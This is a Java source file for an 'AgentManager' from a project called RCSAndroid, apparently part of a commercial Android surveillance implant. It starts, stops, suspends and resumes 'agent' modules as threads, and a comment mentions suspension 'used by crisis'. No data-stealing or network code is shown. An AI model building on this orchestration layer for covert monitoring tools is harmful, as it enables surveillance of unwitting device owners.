/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

import java.util.HashMap;
import java.util.Iterator;

import android.util.Log;

import com.ht.RCSAndroidGUI.Manager;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.interfaces.AbstractFactory;
import com.ht.RCSAndroidGUI.util.Check;

/**
 * The Class AgentManager.
 */
public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {

	/** The Constant TAG. */
	private static final String TAG = "AgentManager";

	/** The singleton. */
	private volatile static AgentManager singleton;

	/**
	 * Self.
	 * 
	 * @return the agent manager
	 */
	public static AgentManager self() {
		if (singleton == null) {
			synchronized (AgentManager.class) {
				if (singleton == null) {
					singleton = new AgentManager();
					singleton.setFactory(new AgentFactory());
				}
			}
		}

		return singleton;
	}

	/**
	 * Start agents.
	 * 
	 * @return true, if successful
	 */
	public synchronized boolean startAll() {
		HashMap<AgentType, AgentConf> agents;
		agents = status.getAgentsMap();

		if (agents == null) {
			Log.d("QZ", TAG + " Agents map null");
			return false;
		}

		if (running == null) {
			Log.d("QZ", TAG + " Running Agents map null");
			return false;
		}

		final Iterator<AgentType> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final AgentType key = it.next();
			Check.asserts(key != null, "null type");
			AgentConf conf = agents.get(key);

			if (conf.isEnabled()) {
				start(key);
			}
		}

		return true;
	}

	// Deve essere bloccante. Attende l'effettivo stop di tutto.
	/**
	 * Stop agents.
	 */
	public synchronized void stopAll() {
		HashMap<AgentType, AgentConf> agents;
		agents = status.getAgentsMap();
		final Iterator<AgentType> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final AgentType key = it.next();
			stop(key);
		}

		Check.ensures(threads.size() == 0, "Non empty threads");
		Check.ensures(running.size() == 0, "Non empty running");

		running.clear();
		threads.clear();
	}

	/**
	 * Start agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void start(final AgentType key) {
		HashMap<AgentType, AgentConf> agents;

		agents = status.getAgentsMap();

		if (agents == null) {
			Log.d("QZ", TAG + " Agents map null");
			return;
		}

		if (running == null) {
			Log.d("QZ", TAG + " Running Agents map null");
			return;
		}

		AgentBase a = makeAgent(key);

		if (a == null) {
			return;
		}

		// Agent mapped and running
		if (a.isRunning() || a.isSuspended()) {
			Log.d("QZ", TAG + " Agent " + key + " is already running or suspended");
			return;
		}

		a = makeAgent(key);

		Check.asserts(a != null, "null agent");
		Check.asserts(running.get(key) != null, "null running");

		a.parse(agents.get(key));

		final Thread t = new Thread(a);
		if (Configuration.DEBUG) {
			t.setName(a.getClass().getSimpleName());
		}
		threads.put(a, t);
		t.start();

	}

	private AgentBase makeAgent(AgentType type) {
		if (running.containsKey(type) == true) {
			return running.get(type);
		}

		AgentBase base = factory.create(type);

		if (base != null) {
			running.put(type, base);
		}

		return base;
	}

	/**
	 * Stop agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void stop(final AgentType key) {
		final AgentBase a = running.get(key);
		if (a == null) {
			Log.d("QZ", TAG + " Agent " + key + " not present");
			return;
		}

		a.stopThread();
		running.remove(key);

		final Thread t = threads.get(a);
		if (t != null) {
			try {
				t.join();
			} catch (final InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		threads.remove(a);
	}

	/**
	 * Suspend an agent, used by crisis
	 * 
	 * @param key
	 *            the key
	 */
	private void suspend(int key) {
		final AgentBase a = running.get(key);
		if (a == null) {
			Log.d("QZ", TAG + " Agent " + key + " not present");
			return;
		}
		suspend(a);
	}

	public synchronized void suspend(AgentBase agent) {
		// suspending a thread implies a stop
		if (agent.isRunning()) {
			agent.stopThread();
			final Thread t = threads.get(agent);
			if (t != null) {
				try {
					t.join();
				} catch (final InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			threads.remove(agent);
			agent.suspend();
			Check.asserts(agent.isSuspended(), "not suspended");
		} else {
			Log.d("QZ", TAG + " (suspend) Error: thread not running. " + agent.getStatus());
		}

	}

	/**
	 * Resume an agent, only if suspended
	 * 
	 * @param key
	 *            the key
	 */
	private void resume(int key) {

		final AgentBase a = running.get(key);
		if (a == null) {
			Log.d("QZ", TAG + " Agent " + key + " not present");
			return;
		}

		resume(a);

	}

	public synchronized void resume(AgentBase agent) {

		if (agent.isSuspended()) {
			// this clean the suspendend status
			agent.resume();

			// start a new thread and restart the loop.
			final Thread t = new Thread(agent);
			threads.put(agent, t);
			t.start();

		} else {
			Log.d("QZ", TAG + " (resume) Error: not suspended. " + agent.getStatus());
		}
	}

}
